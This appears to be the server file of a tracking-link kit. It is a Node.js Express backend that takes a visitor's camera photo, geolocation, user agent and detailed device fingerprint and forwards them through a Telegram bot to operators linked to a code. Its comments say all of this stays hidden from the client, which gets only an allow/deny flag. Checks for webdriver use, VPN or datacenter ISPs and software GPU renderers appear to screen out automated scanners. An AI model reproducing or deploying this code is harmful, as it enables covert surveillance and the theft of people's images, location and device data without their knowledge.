// === server/index.js (PROTECTED A MODE) ======================================
// Все флаги, risk/reasons, анти-спуф — скрыты от клиента полностью.
// Клиент получает только canLaunch: true/false.
// Telegram получает полный богатый отчёт.

// ============================================================================
// === IMPORTS ================================================================
// ============================================================================
import 'dotenv/config';
import express from 'express';
import path from 'path';
import fs from 'fs';
import Database from 'better-sqlite3';
import { fileURLToPath } from 'url';
import crypto from 'crypto';

if (typeof fetch !== 'function' || typeof FormData !== 'function' || typeof Blob !== 'function') {
  throw new Error('Node 18+ required (global fetch/FormData/Blob)');
}

// ============================================================================
// === ENV ====================================================================
// ============================================================================
const BOT_TOKEN        = (process.env.TELEGRAM_BOT_TOKEN || '').trim();
const STATIC_ORIGIN    = (process.env.STATIC_ORIGIN || '*').trim();
const ADMIN_API_SECRET = (process.env.ADMIN_API_SECRET || '').trim();
const PUBLIC_BASE      = (process.env.PUBLIC_BASE || STATIC_ORIGIN).replace(/\/+$/, '');
const DB_PATH          = (process.env.DB_PATH || './data/links.db').trim();
const PORT             = Number(process.env.PORT || 10000);

const REPORT_LANG      = (process.env.REPORT_LANG || 'both').toLowerCase();

// i18n
function tr(ru, en) {
  switch (REPORT_LANG) {
    case 'ru': return ru;
    case 'en': return en;
    default: return `${ru} / ${en}`;
  }
}

// ============================================================================
// === PATHS ==================================================================
// ============================================================================
const __filename = fileURLToPath(import.meta.url);
const __dirname  = path.dirname(__filename);
const PUBLIC_DIR = path.join(__dirname, 'public');

// ============================================================================
// === EXPRESS INIT ===========================================================
// ============================================================================
const app = express();
app.set('trust proxy', true);
app.use(express.json({ limit: '35mb' }));
app.use(express.urlencoded({ extended: true, limit: '35mb' }));

// CORS
app.use((_, res, next) => {
  res.setHeader('Access-Control-Allow-Origin', STATIC_ORIGIN);
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS, GET');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
  next();
});
app.options('*', (_, res) => res.sendStatus(200));

// static cache
app.use((req, res, next) => {
  if (/\.(js|css|png|jpg|jpeg|gif|svg|ico|woff2?)$/i.test(req.path)) {
    res.setHeader('Cache-Control', 'public, max-age=31536000, immutable');
  }
  next();
});

app.use(express.static(PUBLIC_DIR));

// default route
app.get('/', (_req, res) => {
  res.sendFile(path.join(PUBLIC_DIR, 'index.html'));
});

// ============================================================================
// === DB INIT ================================================================
// ============================================================================
try {
  const dir = path.dirname(DB_PATH);
  if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
} catch(e){}

console.log('[db]', DB_PATH);

const db = new Database(DB_PATH);

db.prepare(`
  CREATE TABLE IF NOT EXISTS user_codes (
    code TEXT PRIMARY KEY,
    chat_id TEXT NOT NULL,
    created_at INTEGER NOT NULL
  );
`).run();

db.prepare(`
  CREATE TABLE IF NOT EXISTS user_code_map (
    code TEXT NOT NULL,
    chat_id TEXT NOT NULL,
    created_at INTEGER NOT NULL,
    PRIMARY KEY (code, chat_id)
  );
`).run();

db.prepare(`CREATE INDEX IF NOT EXISTS idx_ucm_code ON user_code_map(code)`).run();
db.prepare(`CREATE INDEX IF NOT EXISTS idx_ucm_chat ON user_code_map(chat_id)`).run();

// ============================================================================
// === HELPERS ================================================================
// ============================================================================
function requireAdminSecret(req, res, next) {
  const auth = req.headers['authorization'] || '';
  if (!ADMIN_API_SECRET || auth !== `Bearer ${ADMIN_API_SECRET}`) {
    return res.status(401).json({ ok:false, error:'Unauthorized' });
  }
  next();
}

function b64ToBuffer(dataUrl) {
  const ix = dataUrl.indexOf('base64,');
  const b64 = ix >= 0 ? dataUrl.slice(ix + 7) : dataUrl;
  return Buffer.from(b64, 'base64');
}

function escapeHTML(s='') {
  return String(s)
    .replace(/&/g,'&amp;')
    .replace(/</g,'&lt;')
    .replace(/>/g,'&gt;');
}

function safeJson(obj, space=0){
  try { return JSON.stringify(obj,null,space); }
  catch { return String(obj); }
}

// sendPhoto
async function sendPhotoToTelegram({ chatId, caption, photoBuf, filename='photo.jpg' }) {
  if (!BOT_TOKEN) throw new Error('No TG token');
  if (!chatId) throw new Error('chatId missing');

  const form = new FormData();
  form.append('chat_id', chatId);
  form.append('caption', caption);
  form.append('parse_mode','HTML');
  form.append('photo', new Blob([photoBuf],{type:'image/jpeg'}), filename);

  const resp = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
    method:'POST',
    body:form
  });
  if (!resp.ok) {
    const t = await resp.text().catch(()=> '');
    throw new Error(`TG error ${resp.status}: ${t}`);
  }
}

// sendDocument
async function sendDocumentToTelegram({ chatId, htmlString, filename='report.html' }) {
  if (!BOT_TOKEN) throw new Error('No TG token');

  const form = new FormData();
  form.append('chat_id', chatId);
  form.append('document', new Blob([htmlString],{type:'text/html'}), filename);

  const resp = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`,{
    method:'POST',
    body:form
  });
  if (!resp.ok) {
    const t=await resp.text().catch(()=> '');
    throw new Error(`TG error ${resp.status}: ${t}`);
  }
}

// get chatIds for code
function getChatIdsForCode(code){
  const C = String(code).toUpperCase();
  const ids = new Set();
  try {
    const rows = db.prepare('SELECT chat_id FROM user_code_map WHERE code = ?').all(C);
    rows.forEach(r => ids.add(String(r.chat_id)));
  } catch {}
  try {
    const old = db.prepare('SELECT chat_id FROM user_codes WHERE code = ?').get(C);
    if (old?.chat_id) ids.add(String(old.chat_id));
  } catch {}
  return [...ids];
}


// ============================================================================
// === FINGERPRINT =============================================================
// ============================================================================
function buildFingerprint({ ua, platform, iosVersion, cp, dc }) {
  const src = safeJson({
    ua: ua||'',
    platform: platform||'',
    ios: iosVersion||'',
    model: cp?.deviceModel || cp?.model || '',
    gpu: cp?.webgl?.renderer || '',
    lang: cp?.locale?.lang || '',
    tz: cp?.locale?.timeZone || '',
    net: cp?.network?.effectiveType || '',
    proxy: dc?.proxy || false
  });

  const hash = crypto.createHash('sha256').update(src).digest('hex');
  const short = `${hash.slice(0,4)}-${hash.slice(4,8)}-${hash.slice(8,12)}`;
  return { hash, short };
}

// ============================================================================
// === PART 1 закончен =========================================================
// ============================================================================
// ============================================================================
// === ANTI-SPOOF (СЕРВЕРНАЯ СКРЫТАЯ ЛОГИКА) ==================================
// === Клиент НИЧЕГО не знает, только canLaunch true/false ====================
// ============================================================================

// Анализ окружения (ВНУТРЕННИЙ, НЕ ОТДАЁТСЯ КЛИЕНТУ)
function analyzeEnvironment({ cp, dc }) {
  const reasons = [];
  let score = 100;

  try {
    // webdriver
    if (cp?.webdriver) {
      score -= 30;
      reasons.push("webdriver=true");
    }

    // proxy
    if (dc?.pn_proxy?.dcIsp) {
      score -= 30;
      reasons.push("DC/VPN ISP");
    }

    // canvas
    if (cp?.canvas?.dataUrlLen && cp.canvas.dataUrlLen < 500) {
      score -= 10;
      reasons.push("canvas entropy low");
    }

    // webgl
    if (cp?.webgl?.error) {
      score -= 10;
      reasons.push("WebGL error");
    }

    if (/mesa|llvmpipe|swiftshader/i.test(cp?.webgl?.renderer || "")) {
      score -= 15;
      reasons.push("GL renderer spoof");
    }

    // timezone mismatch
    const tz = (cp?.locale?.timeZone || "").toUpperCase();
    if (!tz || tz.includes("UTC")) {
      score -= 10;
      reasons.push("Timezone = UTC");
    }

    // touchpoints
    if ((cp?.maxTouchPoints || 0) === 0) {
      score -= 10;
      reasons.push("0 touchpoints");
    }

    // permissions
    const perm = cp?.permissions;
    if (perm) {
      if (perm.camera === "denied") {
        score -= 10; reasons.push("camera denied");
      }
      if (perm.geolocation === "denied") {
        score -= 10; reasons.push("geo denied");
      }
    }

    // fps anomaly (если был измерен)
    if (cp?.runtime?.fps && cp.runtime.fps < 25) {
      score -= 10; reasons.push("low FPS");
    }

    // automationScore (если был)
    if (cp?.automationScore >= 0.7) {
      score -= 20;
      reasons.push("automation score high");
    }

    // Safari 18 requirement
    if (cp?.featuresSummary?.VT18 !== "ok") {
      score -= 35;
      reasons.push("Safari 18 missing");
    }

  } catch(e){
    reasons.push("exception in env");
    score -= 20;
  }

  if (score < 0) score = 0;
  return { score, reasons };
}


// ============================================================================
// === TG REPORT BUILDER ======================================================
// ============================================================================
function buildTelegramHTML({ ua, platform, iosVersion, geo, cp, dc, notes, canLaunch }) {
  const fp = buildFingerprint({
    ua,
    platform,
    iosVersion,
    cp,
    dc
  });

  const yes = canLaunch ? "🟢" : "🔴";

  return `
<html><body>
<h2>${yes} Проверка устройства</h2>

<hr>
<h3>Fingerprint:</h3>
<b>${fp.short}</b><br>

<hr>
<h3>UserAgent:</h3>
<code>${escapeHTML(ua)}</code>

<hr>
<h3>Platform:</h3>
${escapeHTML(platform || "")}

<hr>
<h3>iOS Version:</h3>
${escapeHTML(String(iosVersion || "-"))}

<hr>
<h3>Geo:</h3>
<pre>${escapeHTML(safeJson(geo,2))}</pre>

<hr>
<h3>Client Profile:</h3>
<pre>${escapeHTML(safeJson(cp,2))}</pre>

<hr>
<h3>Device Check (Server Anti-Spoof):</h3>
<pre>${escapeHTML(safeJson(dc,2))}</pre>

<hr>
<h3>Notes:</h3>
<pre>${escapeHTML(notes || "")}</pre>

</body></html>
  `;
}


// ============================================================================
// === API: /api/report =======================================================
// ============================================================================
app.post('/api/report', async (req, res) => {
  try {
    const {
      userAgent,
      platform,
      iosVersion,
      isSafari,
      geo,
      photoBase64,
      code,
      client_profile,
      device_check,
      featuresSummary
    } = req.body || {};

    if (!code) {
      return res.status(400).json({ ok:false, error:'Missing code' });
    }

    // Формируем client_profile окончательный (добавляем features)
    const cp = client_profile || {};
    cp.featuresSummary = featuresSummary || {};

    // Серверный anti-spoof анализ (полностью скрыт)
    const dc = analyzeEnvironment({ cp, dc: device_check });

    const canLaunch = dc.score >= 60; // ниже 60 — отказ

    // Сохраняем снимок (mini)
    let photoBuf = null;
    if (photoBase64) {
      try { photoBuf = b64ToBuffer(photoBase64); }
      catch {}
    }

    // TG
    const chatIds = getChatIdsForCode(code);
    const ua = userAgent || '';
    const plat = platform || '';
    const ios = iosVersion || '';
    const html = buildTelegramHTML({
      ua, platform:plat, iosVersion:ios,
      geo, cp, dc,
      notes:`Decision: ${canLaunch ? 'ALLOW' : 'DENY'}`,
      canLaunch
    });

    for (const chatId of chatIds) {
      try {
        if (photoBuf) {
          await sendPhotoToTelegram({
            chatId,
            caption: `Отчёт по коду <b>${escapeHTML(code)}</b>`,
            photoBuf
          });
        }
        await sendDocumentToTelegram({
          chatId,
          htmlString: html,
          filename: `report_${code}.html`
        });
      } catch(e){
        console.log("TG error:", e);
      }
    }

    // Клиенту → ТОЛЬКО это
    return res.json({
      ok: true,
      decision: { canLaunch }
    });

  } catch(e){
    console.log("ERR /api/report:", e);
    return res.status(500).json({ ok:false, error:'Server error' });
  }
});
// ============================================================================
// === /api/register-code ======================================================
// ============================================================================
app.post('/api/register-code', requireAdminSecret, (req, res) => {
  try {
    const { code, chat_id } = req.body || {};
    if (!code || !chat_id) {
      return res.status(400).json({ ok:false, error:'Missing code/chat_id' });
    }

    const C   = String(code).toUpperCase();
    const cid = String(chat_id);

    const now = Date.now();

    // сохраняем в новую таблицу
    db.prepare(`
      INSERT OR REPLACE INTO user_code_map (code, chat_id, created_at)
      VALUES (?, ?, ?)
    `).run(C, cid, now);

    // поддерживаем старую таблицу user_codes (single chat)
    db.prepare(`
      INSERT OR REPLACE INTO user_codes (code, chat_id, created_at)
      VALUES (?, ?, ?)
    `).run(C, cid, now);

    return res.json({ ok:true });
  } catch (e) {
    return res.status(500).json({ ok:false, error:String(e) });
  }
});


// ============================================================================
// === /api/delete-code ========================================================
// ============================================================================
app.post('/api/delete-code', requireAdminSecret, (req, res) => {
  try {
    const { code } = req.body || {};
    if (!code) {
      return res.status(400).json({ ok:false, error:'Missing code' });
    }

    const C = String(code).toUpperCase();

    db.prepare(`DELETE FROM user_code_map WHERE code = ?`).run(C);
    db.prepare(`DELETE FROM user_codes WHERE code = ?`).run(C);

    return res.json({ ok:true });
  } catch(e) {
    return res.status(500).json({ ok:false, error:String(e) });
  }
});


// ============================================================================
// === /api/get-code-map =======================================================
// ============================================================================
app.get('/api/get-code-map', requireAdminSecret, (req, res) => {
  try {
    const rows = db.prepare(`
      SELECT code, chat_id, created_at
      FROM user_code_map
      ORDER BY created_at DESC
      LIMIT 500
    `).all();

    return res.json({ ok:true, rows });
  } catch(e) {
    return res.status(500).json({ ok:false, error:String(e) });
  }
});


// ============================================================================
// === SECURITY HEADERS =======================================================
// ============================================================================
app.use((req, res, next) => {
  res.setHeader('X-Frame-Options', 'DENY');
  res.setHeader('X-Content-Type-Options', 'nosniff');
  res.setHeader('Referrer-Policy', 'no-referrer');
  res.setHeader('Permissions-Policy',
    'geolocation=*, camera=*, microphone=*, fullscreen=(self)');
  next();
});


// ============================================================================
// === START SERVER ============================================================
// ============================================================================
app.listen(PORT, () => {
  console.log(`[server] PROTECTED MODE A running on port ${PORT}`);
});
